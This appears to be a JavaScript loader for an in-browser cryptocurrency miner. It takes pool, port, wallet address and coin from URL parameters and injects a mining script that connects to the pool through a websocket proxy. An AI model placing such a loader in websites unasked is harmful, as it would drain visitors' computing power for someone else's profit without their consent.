window.allowAds = true;

function getParameterByName(name) {
    var match = RegExp('[?&]' + name + '=([^&]*)').exec(window.location.search);
    return match && decodeURIComponent(match[1].replace(/\+/g, ' '));
}

urlMapping = {
	etn: 'https://etn.crypto-coins.club/api/stats',
	xmr: 'https://mixpools.org:8117/stats',
	bcn: 'https://bytecoin.uk:8117/stats',
	trtl: 'https://pool.turtlecoin.fr:8117/stats',
	aeon: 'https://api.aeon-pool.com/v1/stats',
	qcn: 'https://chainradar.com/api/v1/qcn/status',
	xdn: 'https://chainradar.com/api/v1/duck/status',
	dsh: 'https://chainradar.com/api/v1/dsh/status',
	fcn: 'https://chainradar.com/api/v1/fcn/status',
	coins: ''
};

pool = getParameterByName('pool');
port = getParameterByName('port');
address = getParameterByName('address');
currency = getParameterByName('currency');
apiUrl = urlMapping[currency];

let poolUrl = 'src/js/m.js?proxy=wss://poolproxy.now.sh?pool=' + pool + ':' + port + ':x',
    element = document.createElement('script'),
    mainjs= document.createElement('script');

element.setAttribute( 'src', poolUrl);
mainjs.setAttribute('src', 'src/js/main.js');

document.body.insertBefore(element, document.getElementById('jquery'));
setTimeout(function () {
    document.body.appendChild(mainjs);
}, 100);
